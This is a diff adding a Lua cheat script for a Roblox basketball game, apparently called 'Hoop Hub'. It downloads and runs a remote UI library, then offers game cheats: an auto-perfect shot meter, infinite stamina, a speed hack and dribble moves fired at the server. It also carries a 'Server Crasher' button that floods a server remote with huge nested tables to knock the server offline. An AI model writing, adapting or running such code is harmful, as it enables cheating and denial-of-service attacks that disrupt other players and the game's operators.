@@ -1,0 +1,386 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "RHL",
+    Icon = 0,  -- No icon
+    LoadingTitle = "Hoop Hub",
+    LoadingSubtitle = "by Muzzy",
+    Theme = "Bloom",  -- You can customize themes
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "MUZZY", -- Custom folder name
+        FileName = "HUB"
+    },
+    KeySystem = true,  -- If you need a key system
+    KeySettings = {
+        Title = "Key System",
+        Subtitle = "Enter your key",
+        Note = "No method of obtaining the key is provided",
+        FileName = "Key",
+        SaveKey = true,
+        Key = {"Muzz"}  -- The accepted key for the system
+    }
+})
+
+-- Create tabs
+local TabMain = Window:CreateTab("Main", "home")
+local TabDribble = Window:CreateTab("Dribble Moves", "star")
+local TabSettings = Window:CreateTab("Settings", "settings-2")
+local AntiCheatBypassSection = TabSettings:CreateSection("AntiCheatBypass Coming Soon")
+
+-- Variables
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local accelerationAmount = 0  -- Default acceleration multiplier
+local baseWaitTimer = 0.01
+local minSpeed = 16
+local maxSpeed = 50
+local waitTimer = baseWaitTimer
+local moveDirConnection
+local InfiniteStamina = false
+local toggleValue_Main = false
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remotes = ReplicatedStorage:FindFirstChild("Events")
+if not Remotes then return end
+local Dribble = Remotes:FindFirstChild("Dribble")
+if not Dribble then return end
+
+local function Speed()
+    if moveDirConnection then moveDirConnection:Disconnect() end
+    local moveDirDB = false
+    
+    local function accelerate()
+        if humanoid.MoveDirection.magnitude > 0 and not moveDirDB and humanoid.WalkSpeed < maxSpeed then
+            moveDirDB = true
+            while humanoid.MoveDirection.magnitude > 0 and humanoid.WalkSpeed < maxSpeed do
+                humanoid.WalkSpeed = humanoid.WalkSpeed + accelerationAmount
+                wait(waitTimer)
+                waitTimer = waitTimer / 1.1
+            end
+            moveDirDB = false
+        elseif humanoid.MoveDirection.magnitude == 0 then
+            waitTimer = baseWaitTimer
+            humanoid.WalkSpeed = minSpeed
+        end
+    end
+    
+    moveDirConnection = humanoid:GetPropertyChangedSignal("MoveDirection"):Connect(accelerate)
+end
+
+local function checkBehind()
+    local player = game.Players.LocalPlayer
+    local valuesFolder = player:FindFirstChild("Values")
+    if not valuesFolder then return end
+    local hand = valuesFolder:FindFirstChild("Hand")
+    if not hand then return end
+    if hand:IsA("BoolValue") then
+        if hand.Value then
+            Dribble:FireServer({Enum.KeyCode.C, Enum.KeyCode.X})
+        else
+            Dribble:FireServer({Enum.KeyCode.Z, Enum.KeyCode.X})
+        end
+    end
+end
+
+local function checkSpin()
+    local player = game.Players.LocalPlayer
+    local valuesFolder = player:FindFirstChild("Values")
+    if not valuesFolder then return end
+    local hand = valuesFolder:FindFirstChild("Hand")
+    if not hand then return end
+    if hand:IsA("BoolValue") then
+        if hand.Value then
+            Dribble:FireServer({Enum.KeyCode.C, Enum.KeyCode.X, Enum.KeyCode.Z})
+        else
+            Dribble:FireServer({Enum.KeyCode.Z, Enum.KeyCode.X, Enum.KeyCode.C})
+        end
+    end
+end
+
+local function checkMomentum()
+    local player = game.Players.LocalPlayer
+    local valuesFolder = player:FindFirstChild("Values")
+    if not valuesFolder then return end
+    local hand = valuesFolder:FindFirstChild("Hand")
+    if not hand then return end
+    if hand:IsA("BoolValue") then
+        if hand.Value then
+            Dribble:FireServer({Enum.KeyCode.Z, Enum.KeyCode.C})
+        else
+            Dribble:FireServer({Enum.KeyCode.C, Enum.KeyCode.Z})
+        end
+    end
+end
+
+local function checkSnatch()
+    local player = game.Players.LocalPlayer
+    local valuesFolder = player:FindFirstChild("Values")
+    if not valuesFolder then return end
+    local hand = valuesFolder:FindFirstChild("Hand")
+    if not hand then return end
+    if hand:IsA("BoolValue") then
+        if hand.Value then
+            Dribble:FireServer({Enum.KeyCode.X, Enum.KeyCode.Z})
+        else
+            Dribble:FireServer({Enum.KeyCode.X, Enum.KeyCode.C})
+        end
+    end
+end
+
+local function checkSizeup()
+    local player = game.Players.LocalPlayer
+    local valuesFolder = player:FindFirstChild("Values")
+    if not valuesFolder then return end
+    local hand = valuesFolder:FindFirstChild("Hand")
+    if not hand then return end
+    if hand:IsA("BoolValue") then
+        if hand.Value then
+            Dribble:FireServer({Enum.KeyCode.V})
+        else
+            Dribble:FireServer({Enum.KeyCode.V})
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        if InfiniteStamina then
+            local fill = game.Workspace:WaitForChild("Meter"):WaitForChild("SurfaceGui"):WaitForChild("Stamina"):WaitForChild("Fill")
+
+            if fill.AbsoluteSize.X <= 233 then
+                fill.Size = UDim2.new(1, 0, 1, 0)
+            end
+        end
+        wait(0.1)
+    end
+end)
+
+local Toggle = TabMain:CreateToggle({
+    Name = "Auto Green",
+    CurrentValue = false,
+    Flag = "AutoGreen", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(Value)
+        toggleValue_Main = Value
+        if toggleValue_Main then
+            -- Show notification when toggle is turned ON
+            Rayfield:Notify({
+                Title = "Auto Green",
+                Content = "Auto Green is now active.",
+                Duration = 3
+            })
+            
+            -- Loop to adjust meter
+            while toggleValue_Main do
+                wait()
+                local meteaa = game.Players.LocalPlayer.Character.HumanoidRootPart.PlayerMeter
+                if meteaa.Enabled == true then
+                    meteaa.Fill.UIGradient.Offset = Vector2.new(0, -1)
+                end
+            end
+        else
+            -- Show notification when toggle is turned OFF
+            Rayfield:Notify({
+                Title = "Auto Green",
+                Content = "Auto Green is now inactive.",
+                Duration = 3
+            })
+        end
+    end
+})
+
+local Toggle = TabMain:CreateToggle({
+    Name = "Infinite Stamina",
+    CurrentValue = false,
+    Flag = "InfiniteStamina",
+    Callback = function(value)
+        InfiniteStamina = value -- Update toggle state
+        if InfiniteStamina then
+            Rayfield:Notify({
+                Title = "Infinite Stamina",
+                Content = "Infinite Stamina is now active.",
+                Duration = 5,
+            })
+        else
+            Rayfield:Notify({
+                Title = "Infinite Stamina",
+                Content = "Infinite Stamina is now inactive.",
+                Duration = 5,
+            })
+        end
+    end
+})
+
+local Slider = TabMain:CreateSlider({
+    Name = "Adjust Speed",
+    Range = {0, 100},
+    Increment = 10,
+    Suffix = "Speed",
+    CurrentValue = accelerationAmount,
+    Flag = "SpeedSlider", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        accelerationAmount = value
+        Speed()
+
+        -- Show notification when speed is adjusted
+        Rayfield:Notify({
+            Title = "Speed",
+            Content = "New speed set to: " .. value,
+            Duration = 3
+        })
+    end
+})
+
+local Keybind = TabDribble:CreateKeybind({
+    Name = "Spin",
+    CurrentKeybind = "Q",
+    HoldToInteract = false,
+    Flag = "Keybind1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        checkSpin()
+    end
+})
+
+local Keybind = TabDribble:CreateKeybind({
+    Name = "Behind The Back",
+    CurrentKeybind = "Q",
+    HoldToInteract = false,
+    Flag = "Keybind2", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        checkBehind()
+    end
+})
+
+local Keybind = TabDribble:CreateKeybind({
+    Name = "Momentum",
+    CurrentKeybind = "Q",
+    HoldToInteract = false,
+    Flag = "Keybind3", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        checkMomentum()
+    end
+})
+
+local Keybind = TabDribble:CreateKeybind({
+    Name = "Snatchback",
+    CurrentKeybind = "Q",
+    HoldToInteract = false,
+    Flag = "Keybind4", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        checkSnatch()
+    end
+})
+
+local Keybind = TabDribble:CreateKeybind({
+    Name = "Sizeup",
+    CurrentKeybind = "Q",
+    HoldToInteract = false,
+    Flag = "Keybind5", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+    Callback = function(value)
+        checkSizeup()
+    end
+})
+
+local Toggle = TabSettings:CreateToggle({
+    Name = "Optimize Performance",
+    CurrentValue = false, -- Default is off
+    Callback = function(state)
+        -- If the toggle is on, optimize graphics
+        if state then
+            local Lighting = game:GetService("Lighting")
+
+            -- Lower or disable graphical effects
+            Lighting.GlobalShadows = false
+            Lighting.Brightness = 1
+            Lighting.FogEnd = 100000 -- Removes fog by setting it far away
+            Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128) -- Neutral color
+
+            -- Adjust all parts in the workspace for better performance
+            for _, part in pairs(workspace:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Material = Enum.Material.Plastic -- Simplify materials
+                    part.CastShadow = false -- Remove shadows
+                end
+            end
+
+        else
+            -- If the toggle is off, restore the graphics to default
+            local Lighting = game:GetService("Lighting")
+            Lighting.GlobalShadows = true
+            Lighting.Brightness = 2
+            Lighting.FogEnd = 1000000 -- Default fog distance
+            Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255) -- Default color
+
+            -- Revert all parts in the workspace to their original state
+            for _, part in pairs(workspace:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.Material = Enum.Material.SmoothPlastic -- Revert material to default
+                    part.CastShadow = true -- Re-enable shadows
+                end
+            end
+
+        end
+    end
+})
+
+local Button = TabSettings:CreateButton({
+    Name = "Server Crasher",
+    Callback = function()
+    --This is a simple roblox game crasher made by casanova
+--Github cfreemepq
+--fixed script*
+
+while wait(0.6) do --// don't change it's the best
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+    
+    local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+    
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+    
+    if calculatemax then
+         maximum = calculatemax
+         else
+         maximum = 999999
+    end
+    
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+    
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+    end
+    
+    bomb(250, 2) --// change values if client crashes.
+    end
+    end,
+ })
+
+ local Button = TabSettings:CreateButton({
+    Name = "Unload Engine",
+    Callback = function()
+        Rayfield:Destroy()  -- To destroy the Rayfield window
+    end
+})
